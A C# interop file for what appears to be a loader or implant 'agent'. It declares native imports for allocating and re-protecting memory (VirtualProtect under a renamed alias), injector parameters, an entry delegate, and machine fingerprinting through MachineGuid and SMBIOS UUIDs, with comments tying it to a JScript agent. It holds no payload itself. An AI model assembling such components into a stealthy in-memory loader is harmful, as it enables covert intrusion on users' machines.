using System;
using System.Runtime.InteropServices;

namespace CSharpAgent
{
    [StructLayout(LayoutKind.Sequential)]
    internal struct Parameters
    {
        public uint InjectorVersion;
        public uint InjectorCompilationType;
        public IntPtr DllPath;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct SYSTEM_INFO
    {
        public ushort wProcessorArchitecture;
        public ushort wReserved;
        public uint dwPageSize;
        public IntPtr lpMinimumApplicationAddress;
        public IntPtr lpMaximumApplicationAddress;
        public IntPtr dwActiveProcessorMask;
        public uint dwNumberOfProcessors;
        public uint dwProcessorType;
        public uint dwAllocationGranularity;
        public ushort wProcessorLevel;
        public ushort wProcessorRevision;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct OSVERSIONINFOW
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate IntPtr GetTEBDelegate();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate int NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref UIntPtr RegionSize,
        uint AllocationType,
        uint Protect
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate int EntryDelegate(ulong injectorVersion);

    internal static class NativeImports
    {
        [DllImport("kernel32.dll", EntryPoint = "VirtualProtect", SetLastError = true)]
        internal static extern bool ChangeMemoryProtection(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        internal static extern void GetNativeSystemInfo(out SYSTEM_INFO lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

        // Truthful OS version (Environment.OSVersion inherits the host manifest's compatibility
        // lies on Windows 8.1+). Returns 0 on success.
        [DllImport("ntdll.dll")]
        internal static extern int RtlGetVersion(ref OSVERSIONINFOW versionInfo);

        // MachineGuid through the EXPLICIT 32-bit registry view — see Identity.MachineGuid32View.
        // dwFlags = RRF_RT_REG_SZ | RRF_SUBKEY_WOW6432KEY (RegGetValue takes its OWN wow64
        // selectors — the KEY_WOW64_*KEY bits belong to RegOpenKeyEx's samDesired and are
        // silently ignored here); returns 0 (ERROR_SUCCESS) on success. The 64-bit view is
        // deliberately never requested: the JScript host can only reach the 32-bit view, so
        // that is the canonical identity source for every breed.
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int RegGetValue(
            IntPtr hkey, string lpSubKey, string lpValue, uint dwFlags,
            out uint pdwType, byte[] pvData, ref uint pcbData);

        // Raw SMBIOS tables ('RSMB') for the UUID fallback — the same value the JScript agent's
        // Win32_ComputerSystemProduct fallback yields, read without a WMI dependency. Returns
        // the required buffer size when called with a null buffer.
        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern uint GetSystemFirmwareTable(
            uint firmwareTableProviderSignature, uint firmwareTableID,
            byte[] firmwareTableBuffer, uint size);
    }
}
